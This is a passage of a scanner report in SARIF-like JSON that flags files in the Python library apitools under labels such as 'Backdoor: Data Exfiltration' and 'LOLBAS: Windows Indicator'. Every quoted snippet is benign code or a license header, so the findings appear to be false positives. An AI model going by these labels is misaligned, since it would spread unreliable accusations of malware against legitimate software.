          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer_test.py"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 34,
                  "endLine": 117,
                  "endColumn": 43,
                  "snippet": {
                    "text": "                content=string.ascii_lowercase,\n                request_url=base_url,\n            )\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(1, make_request.call_count)\n            received_request = make_request.call_args[0][1]\n",
                    "rendered": {
                      "text": "                content=string.ascii_lowercase,\n                request_url=base_url,\n            )\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(1, make_request.call_count)\n            received_request = make_request.call_args[0][1]\n",
                      "markdown": "`                content=string.ascii_lowercase,\n                request_url=base_url,\n            )\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(1, make_request.call_count)\n            received_request = make_request.call_args[0][1]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/extra_types.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 1095,
                  "startColumn": 19,
                  "endLine": 1095,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                self.__total_size = end\n        elif self.total_size is None:\n            # For the streaming resumable case, we need to detect when\n            # we're at the end of the stream.\n            body_stream = buffered_stream.BufferedStream(\n                self.stream, start, self.chunksize)\n            end = body_stream.stream_end_position\n",
                    "rendered": {
                      "text": "                self.__total_size = end\n        elif self.total_size is None:\n            # For the streaming resumable case, we need to detect when\n            # we're at the end of the stream.\n            body_stream = buffered_stream.BufferedStream(\n                self.stream, start, self.chunksize)\n            end = body_stream.stream_end_position\n",
                      "markdown": "`                self.__total_size = end\n        elif self.total_size is None:\n            # For the streaming resumable case, we need to detect when\n            # we're at the end of the stream.\n            body_stream = buffered_stream.BufferedStream(\n                self.stream, start, self.chunksize)\n            end = body_stream.stream_end_position\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 1090,
                  "startColumn": 38,
                  "endLine": 1090,
                  "endColumn": 42,
                  "snippet": {
                    "text": "                self.stream, self.chunksize)\n            end = start + read_length\n            # If the stream length was previously unknown and the input stream\n            # is exhausted, then we're at the end of the stream.\n            if self.total_size is None and exhausted:\n                self.__total_size = end\n        elif self.total_size is None:\n",
                    "rendered": {
                      "text": "                self.stream, self.chunksize)\n            end = start + read_length\n            # If the stream length was previously unknown and the input stream\n            # is exhausted, then we're at the end of the stream.\n            if self.total_size is None and exhausted:\n                self.__total_size = end\n        elif self.total_size is None:\n",
                      "markdown": "`                self.stream, self.chunksize)\n            end = start + read_length\n            # If the stream length was previously unknown and the input stream\n            # is exhausted, then we're at the end of the stream.\n            if self.total_size is None and exhausted:\n                self.__total_size = end\n        elif self.total_size is None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 994,
                  "startColumn": 73,
                  "endLine": 994,
                  "endColumn": 77,
                  "snippet": {
                    "text": "            if self.progress + 1 != self.stream.tell():\n                # TODO(craigcitro): Add a better way to recover here.\n                raise exceptions.CommunicationError(\n                    'Failed to transfer all bytes in chunk, upload paused at '\n                    'byte %d' % self.progress)\n            self._ExecuteCallback(callback, response)\n        if self.__complete and hasattr(self.stream, 'seek'):\n",
                    "rendered": {
                      "text": "            if self.progress + 1 != self.stream.tell():\n                # TODO(craigcitro): Add a better way to recover here.\n                raise exceptions.CommunicationError(\n                    'Failed to transfer all bytes in chunk, upload paused at '\n                    'byte %d' % self.progress)\n            self._ExecuteCallback(callback, response)\n        if self.__complete and hasattr(self.stream, 'seek'):\n",
                      "markdown": "`            if self.progress + 1 != self.stream.tell():\n                # TODO(craigcitro): Add a better way to recover here.\n                raise exceptions.CommunicationError(\n                    'Failed to transfer all bytes in chunk, upload paused at '\n                    'byte %d' % self.progress)\n            self._ExecuteCallback(callback, response)\n        if self.__complete and hasattr(self.stream, 'seek'):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 621,
                  "startColumn": 53,
                  "endLine": 621,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        \"\"\"Create a new Upload object from a filename.\"\"\"\n        path = os.path.expanduser(filename)\n        if not os.path.exists(path):\n            raise exceptions.NotFoundError('Could not find file %s' % path)\n        if not mime_type:\n            mime_type, _ = mimetypes.guess_type(path)\n            if mime_type is None:\n",
                    "rendered": {
                      "text": "        \"\"\"Create a new Upload object from a filename.\"\"\"\n        path = os.path.expanduser(filename)\n        if not os.path.exists(path):\n            raise exceptions.NotFoundError('Could not find file %s' % path)\n        if not mime_type:\n            mime_type, _ = mimetypes.guess_type(path)\n            if mime_type is None:\n",
                      "markdown": "`        \"\"\"Create a new Upload object from a filename.\"\"\"\n        path = os.path.expanduser(filename)\n        if not os.path.exists(path):\n            raise exceptions.NotFoundError('Could not find file %s' % path)\n        if not mime_type:\n            mime_type, _ = mimetypes.guess_type(path)\n            if mime_type is None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 1083,
                  "startColumn": 30,
                  "endLine": 1083,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        \"\"\"Send the specified chunk.\"\"\"\n        self.EnsureInitialized()\n        no_log_body = self.total_size is None\n        request = http_wrapper.Request(url=self.url, http_method='PUT')\n        if self.__gzip_encoded:\n            request.headers['Content-Encoding'] = 'gzip'\n            body_stream, read_length, exhausted = compression.CompressStream(\n",
                    "rendered": {
                      "text": "        \"\"\"Send the specified chunk.\"\"\"\n        self.EnsureInitialized()\n        no_log_body = self.total_size is None\n        request = http_wrapper.Request(url=self.url, http_method='PUT')\n        if self.__gzip_encoded:\n            request.headers['Content-Encoding'] = 'gzip'\n            body_stream, read_length, exhausted = compression.CompressStream(\n",
                      "markdown": "`        \"\"\"Send the specified chunk.\"\"\"\n        self.EnsureInitialized()\n        no_log_body = self.total_size is None\n        request = http_wrapper.Request(url=self.url, http_method='PUT')\n        if self.__gzip_encoded:\n            request.headers['Content-Encoding'] = 'gzip'\n            body_stream, read_length, exhausted = compression.CompressStream(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 1063,
                  "startColumn": 30,
                  "endLine": 1063,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        body_stream = stream_slice.StreamSlice(\n            self.stream, self.total_size - start)\n\n        request = http_wrapper.Request(url=self.url, http_method='PUT',\n                                       body=body_stream)\n        request.headers['Content-Type'] = self.mime_type\n        if start == self.total_size:\n",
                    "rendered": {
                      "text": "        body_stream = stream_slice.StreamSlice(\n            self.stream, self.total_size - start)\n\n        request = http_wrapper.Request(url=self.url, http_method='PUT',\n                                       body=body_stream)\n        request.headers['Content-Type'] = self.mime_type\n        if start == self.total_size:\n",
                      "markdown": "`        body_stream = stream_slice.StreamSlice(\n            self.stream, self.total_size - start)\n\n        request = http_wrapper.Request(url=self.url, http_method='PUT',\n                                       body=body_stream)\n        request.headers['Content-Type'] = self.mime_type\n        if start == self.total_size:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 911,
                  "startColumn": 60,
                  "endLine": 911,
                  "endColumn": 65,
                  "snippet": {
                    "text": "        if http_response.status_code != http_client.OK:\n            raise exceptions.HttpError.FromResponse(http_response)\n\n        self.__server_chunk_granularity = http_response.info.get(\n            'X-Goog-Upload-Chunk-Granularity')\n        url = http_response.info['location']\n        if client is not None:\n",
                    "rendered": {
                      "text": "        if http_response.status_code != http_client.OK:\n            raise exceptions.HttpError.FromResponse(http_response)\n\n        self.__server_chunk_granularity = http_response.info.get(\n            'X-Goog-Upload-Chunk-Granularity')\n        url = http_response.info['location']\n        if client is not None:\n",
                      "markdown": "`        if http_response.status_code != http_client.OK:\n            raise exceptions.HttpError.FromResponse(http_response)\n\n        self.__server_chunk_granularity = http_response.info.get(\n            'X-Goog-Upload-Chunk-Granularity')\n        url = http_response.info['location']\n        if client is not None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 891,
                  "startColumn": 55,
                  "endLine": 891,
                  "endColumn": 60,
                  "snippet": {
                    "text": "            raise exceptions.HttpError.FromResponse(refresh_response)\n\n    def _GetRangeHeaderFromResponse(self, response):\n        return response.info.get('Range', response.info.get('range'))\n\n    def InitializeUpload(self, http_request, http=None, client=None):\n        \"\"\"Initialize this upload from the given http_request.\"\"\"\n",
                    "rendered": {
                      "text": "            raise exceptions.HttpError.FromResponse(refresh_response)\n\n    def _GetRangeHeaderFromResponse(self, response):\n        return response.info.get('Range', response.info.get('range'))\n\n    def InitializeUpload(self, http_request, http=None, client=None):\n        \"\"\"Initialize this upload from the given http_request.\"\"\"\n",
                      "markdown": "`            raise exceptions.HttpError.FromResponse(refresh_response)\n\n    def _GetRangeHeaderFromResponse(self, response):\n        return response.info.get('Range', response.info.get('range'))\n\n    def InitializeUpload(self, http_request, http=None, client=None):\n        \"\"\"Initialize this upload from the given http_request.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 891,
                  "startColumn": 28,
                  "endLine": 891,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            raise exceptions.HttpError.FromResponse(refresh_response)\n\n    def _GetRangeHeaderFromResponse(self, response):\n        return response.info.get('Range', response.info.get('range'))\n\n    def InitializeUpload(self, http_request, http=None, client=None):\n        \"\"\"Initialize this upload from the given http_request.\"\"\"\n",
                    "rendered": {
                      "text": "            raise exceptions.HttpError.FromResponse(refresh_response)\n\n    def _GetRangeHeaderFromResponse(self, response):\n        return response.info.get('Range', response.info.get('range'))\n\n    def InitializeUpload(self, http_request, http=None, client=None):\n        \"\"\"Initialize this upload from the given http_request.\"\"\"\n",
                      "markdown": "`            raise exceptions.HttpError.FromResponse(refresh_response)\n\n    def _GetRangeHeaderFromResponse(self, response):\n        return response.info.get('Range', response.info.get('range'))\n\n    def InitializeUpload(self, http_request, http=None, client=None):\n        \"\"\"Initialize this upload from the given http_request.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 865,
                  "startColumn": 38,
                  "endLine": 865,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        if self.strategy != RESUMABLE_UPLOAD:\n            return\n        self.EnsureInitialized()\n        refresh_request = http_wrapper.Request(\n            url=self.url, http_method='PUT',\n            headers={'Content-Range': 'bytes */*'})\n        refresh_response = http_wrapper.MakeRequest(\n",
                    "rendered": {
                      "text": "        if self.strategy != RESUMABLE_UPLOAD:\n            return\n        self.EnsureInitialized()\n        refresh_request = http_wrapper.Request(\n            url=self.url, http_method='PUT',\n            headers={'Content-Range': 'bytes */*'})\n        refresh_response = http_wrapper.MakeRequest(\n",
                      "markdown": "`        if self.strategy != RESUMABLE_UPLOAD:\n            return\n        self.EnsureInitialized()\n        refresh_request = http_wrapper.Request(\n            url=self.url, http_method='PUT',\n            headers={'Content-Range': 'bytes */*'})\n        refresh_response = http_wrapper.MakeRequest(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 657,
                  "startColumn": 47,
                  "endLine": 657,
                  "endColumn": 52,
                  "snippet": {
                    "text": "            raise exceptions.InvalidUserInputError(\n                'Cannot override total_size on serialized Upload')\n        upload = cls.FromStream(stream, info['mime_type'],\n                                total_size=info.get('total_size'),\n                                gzip_encoded=gzip_encoded, **kwds)\n        if isinstance(stream, io.IOBase) and not stream.seekable():\n            raise exceptions.InvalidUserInputError(\n",
                    "rendered": {
                      "text": "            raise exceptions.InvalidUserInputError(\n                'Cannot override total_size on serialized Upload')\n        upload = cls.FromStream(stream, info['mime_type'],\n                                total_size=info.get('total_size'),\n                                gzip_encoded=gzip_encoded, **kwds)\n        if isinstance(stream, io.IOBase) and not stream.seekable():\n            raise exceptions.InvalidUserInputError(\n",
                      "markdown": "`            raise exceptions.InvalidUserInputError(\n                'Cannot override total_size on serialized Upload')\n        upload = cls.FromStream(stream, info['mime_type'],\n                                total_size=info.get('total_size'),\n                                gzip_encoded=gzip_encoded, **kwds)\n        if isinstance(stream, io.IOBase) and not stream.seekable():\n            raise exceptions.InvalidUserInputError(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 414,
                  "startColumn": 30,
                  "endLine": 414,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    def __GetChunk(self, start, end, additional_headers=None):\n        \"\"\"Retrieve a chunk, and return the full response.\"\"\"\n        self.EnsureInitialized()\n        request = http_wrapper.Request(url=self.url)\n        self.__SetRangeHeader(request, start, end=end)\n        if additional_headers is not None:\n            request.headers.update(additional_headers)\n",
                    "rendered": {
                      "text": "    def __GetChunk(self, start, end, additional_headers=None):\n        \"\"\"Retrieve a chunk, and return the full response.\"\"\"\n        self.EnsureInitialized()\n        request = http_wrapper.Request(url=self.url)\n        self.__SetRangeHeader(request, start, end=end)\n        if additional_headers is not None:\n            request.headers.update(additional_headers)\n",
                      "markdown": "`    def __GetChunk(self, start, end, additional_headers=None):\n        \"\"\"Retrieve a chunk, and return the full response.\"\"\"\n        self.EnsureInitialized()\n        request = http_wrapper.Request(url=self.url)\n        self.__SetRangeHeader(request, start, end=end)\n        if additional_headers is not None:\n            request.headers.update(additional_headers)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer.py"
                },
                "region": {
                  "startLine": 330,
                  "startColumn": 31,
                  "endLine": 330,
                  "endColumn": 36,
                  "snippet": {
                    "text": "                raise exceptions.HttpError.FromResponse(response)\n            self.__initial_response = response\n            self.__SetTotal(response.info)\n            url = response.info.get('content-location', response.request_url)\n        if client is not None:\n            url = client.FinalizeTransferUrl(url)\n        self._Initialize(http, url)\n",
                    "rendered": {
                      "text": "                raise exceptions.HttpError.FromResponse(response)\n            self.__initial_response = response\n            self.__SetTotal(response.info)\n            url = response.info.get('content-location', response.request_url)\n        if client is not None:\n            url = client.FinalizeTransferUrl(url)\n        self._Initialize(http, url)\n",
                      "markdown": "`                raise exceptions.HttpError.FromResponse(response)\n            self.__initial_response = response\n            self.__SetTotal(response.info)\n            url = response.info.get('content-location', response.request_url)\n        if client is not None:\n            url = client.FinalizeTransferUrl(url)\n        self._Initialize(http, url)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 563,
                  "startColumn": 51,
                  "endLine": 563,
                  "endColumn": 55,
                  "snippet": {
                    "text": "                credentials = tools.run_flow(flow, credential_store, flags)\n                break\n            except (oauth2client.client.FlowExchangeError, SystemExit) as e:\n                # Here SystemExit is \"no credential at all\", and the\n                # FlowExchangeError is \"invalid\" -- usually because\n                # you reused a token.\n                print('Invalid authorization: %s' % (e,))\n",
                    "rendered": {
                      "text": "                credentials = tools.run_flow(flow, credential_store, flags)\n                break\n            except (oauth2client.client.FlowExchangeError, SystemExit) as e:\n                # Here SystemExit is \"no credential at all\", and the\n                # FlowExchangeError is \"invalid\" -- usually because\n                # you reused a token.\n                print('Invalid authorization: %s' % (e,))\n",
                      "markdown": "`                credentials = tools.run_flow(flow, credential_store, flags)\n                break\n            except (oauth2client.client.FlowExchangeError, SystemExit) as e:\n                # Here SystemExit is \"no credential at all\", and the\n                # FlowExchangeError is \"invalid\" -- usually because\n                # you reused a token.\n                print('Invalid authorization: %s' % (e,))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 774,
                  "startColumn": 41,
                  "endLine": 774,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    cp = 'https://www.googleapis.com/auth/cloud-platform'\n    if credentials is None:\n        return None\n    if not isinstance(credentials, gc) or cp in scopes:\n        return credentials.create_scoped(scopes)\n    return None\n",
                    "rendered": {
                      "text": "    cp = 'https://www.googleapis.com/auth/cloud-platform'\n    if credentials is None:\n        return None\n    if not isinstance(credentials, gc) or cp in scopes:\n        return credentials.create_scoped(scopes)\n    return None\n",
                      "markdown": "`    cp = 'https://www.googleapis.com/auth/cloud-platform'\n    if credentials is None:\n        return None\n    if not isinstance(credentials, gc) or cp in scopes:\n        return credentials.create_scoped(scopes)\n    return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 771,
                  "startColumn": 3,
                  "endLine": 771,
                  "endColumn": 7,
                  "snippet": {
                    "text": "    # credential will work for us. We assume that if we're requesting\n    # cloud-platform, our scopes are a subset of cloud scopes, and the\n    # ADC will work.\n    cp = 'https://www.googleapis.com/auth/cloud-platform'\n    if credentials is None:\n        return None\n    if not isinstance(credentials, gc) or cp in scopes:\n",
                    "rendered": {
                      "text": "    # credential will work for us. We assume that if we're requesting\n    # cloud-platform, our scopes are a subset of cloud scopes, and the\n    # ADC will work.\n    cp = 'https://www.googleapis.com/auth/cloud-platform'\n    if credentials is None:\n        return None\n    if not isinstance(credentials, gc) or cp in scopes:\n",
                      "markdown": "`    # credential will work for us. We assume that if we're requesting\n    # cloud-platform, our scopes are a subset of cloud scopes, and the\n    # ADC will work.\n    cp = 'https://www.googleapis.com/auth/cloud-platform'\n    if credentials is None:\n        return None\n    if not isinstance(credentials, gc) or cp in scopes:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 586,
                  "startColumn": 32,
                  "endLine": 586,
                  "endColumn": 38,
                  "snippet": {
                    "text": "      the interprocess lock within `_lock_timeout` the call will return as\n      a cache miss or unsuccessful cache write.\n    * App Engine environments cannot be process locked because (1) the runtime\n      does not provide monotonic time and (2) different processes may or may\n      not share the same machine. Because of this, process locks are disabled\n      and locking is only guaranteed to protect against multithreaded access.\n    \"\"\"\n",
                    "rendered": {
                      "text": "      the interprocess lock within `_lock_timeout` the call will return as\n      a cache miss or unsuccessful cache write.\n    * App Engine environments cannot be process locked because (1) the runtime\n      does not provide monotonic time and (2) different processes may or may\n      not share the same machine. Because of this, process locks are disabled\n      and locking is only guaranteed to protect against multithreaded access.\n    \"\"\"\n",
                      "markdown": "`      the interprocess lock within `_lock_timeout` the call will return as\n      a cache miss or unsuccessful cache write.\n    * App Engine environments cannot be process locked because (1) the runtime\n      does not provide monotonic time and (2) different processes may or may\n      not share the same machine. Because of this, process locks are disabled\n      and locking is only guaranteed to protect against multithreaded access.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/credentials_lib.py"
                },
                "region": {
                  "startLine": 509,
